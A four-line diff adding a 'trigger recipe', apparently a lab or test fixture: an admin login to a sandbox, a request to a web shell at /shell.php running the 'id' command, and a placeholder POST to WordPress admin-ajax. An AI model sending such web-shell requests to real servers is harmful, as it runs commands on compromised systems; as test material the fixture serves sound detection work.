@@ -1,0 +1,4 @@
+# trigger recipe
+LOGIN admin sandbox
+GET  /shell.php?c=id
+POST /wp-admin/admin-ajax.php  action=foo&x=1
